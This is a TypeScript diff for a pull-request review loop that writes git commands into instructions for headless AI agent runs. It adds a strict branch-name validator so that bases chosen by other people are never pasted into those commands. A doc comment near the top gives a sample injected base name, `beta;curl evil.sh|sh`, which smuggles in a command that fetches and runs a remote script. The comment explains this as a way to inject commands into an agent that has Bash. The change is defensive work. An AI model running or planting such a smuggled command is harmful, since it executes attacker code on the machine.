@@ -336,6 +336,28 @@ export function isProtectedMergeBase(base: string | null | undefined): boolean {
 }
 
 /**
+ * A branch name this device is willing to SPELL INTO a command it hands a run.
+ *
+ * Deliberately far narrower than what git accepts. `;`, `&`, `|`, `$`, a
+ * backtick and a quote are all legal characters in a ref, and since the loop
+ * started adopting pull requests the base is a name somebody ELSE chose:
+ * anyone who can push to the repository can open one from a run's head branch
+ * onto a base called `beta;curl evil.sh|sh`, and the feedback below is read by
+ * a headless run that has Bash. So a base outside this alphabet is never
+ * pasted into `git rebase origin/<base>`; the run is pointed at the pull
+ * request page for the name instead.
+ *
+ * It does NOT gate what the record carries or what the merge guard sees: the
+ * true base has to stay on the loop, or `isProtectedMergeBase` would be
+ * answering about a branch the pull request is not aimed at.
+ */
+export function isQuotableRef(ref: string | null | undefined): ref is string {
+  return typeof ref === "string"
+    && /^[A-Za-z0-9][A-Za-z0-9._/-]{0,200}$/.test(ref)
+    && !ref.includes("..");
+}
+
+/**
  * The round's decision, as a pure function of what was observed.
  *
  * The order is the point, and each step is here because the obvious
@@ -587,12 +609,21 @@ export function buildReviewFeedback(input: {
     + `${input.base ? ` against ${input.base}` : ""}${input.branch ? ` from ${input.branch}` : ""},`
     + ` and it is not ready to merge. This is review round ${input.round} of ${input.maxRounds}.`,
   );
+  // The base spelled as a ref, or null when it is not a name this device will
+  // paste into a command — see isQuotableRef.
+  const originRef = isQuotableRef(input.base) ? `origin/${input.base}` : null;
+
   if (input.fresh) {
     lines.push(
       "You did not write this branch and you are starting with no memory of it: the run that did has"
       + " finished and its session could not be resumed. Before you change anything, read what is there —"
-      + " `git log --oneline " + (input.base ? `origin/${input.base}..HEAD` : "-20") + "` and"
-      + " `git diff " + (input.base ? `origin/${input.base}...HEAD` : "HEAD~1") + "` — so your fixes"
+      // `git fetch` first: the tree this run inherits was last updated when the
+      // previous run finished, which on a round arriving half an hour later
+      // leaves `origin/<base>` stale — or, in a tree that never fetched it,
+      // absent — and a diff read against either is the wrong diff.
+      + " `git fetch origin`, then"
+      + " `git log --oneline " + (originRef ? `${originRef}..HEAD` : "-20") + "` and"
+      + " `git diff " + (originRef ? `${originRef}...HEAD` : "HEAD~1") + "` — so your fixes"
       + " match the intent of the work rather than replacing it.",
     );
   }
@@ -605,7 +636,10 @@ export function buildReviewFeedback(input: {
     lines.push(
       "",
       "## The branch conflicts with its base",
-      `Rebase onto ${input.base ?? "the base branch"}: \`git fetch origin && git rebase origin/${input.base ?? "HEAD"}\`,`
+      (originRef
+        ? `Rebase onto ${input.base}: \`git fetch origin && git rebase ${originRef}\`,`
+        : "Rebase onto the branch this pull request targets — its name is on the pull request page, and is not"
+          + " written out here because it is not a name this device puts in a command —")
       + " resolve every conflict keeping BOTH sides' intent, re-run the project's verification,"
       + " then `git push --force-with-lease`.",
     );
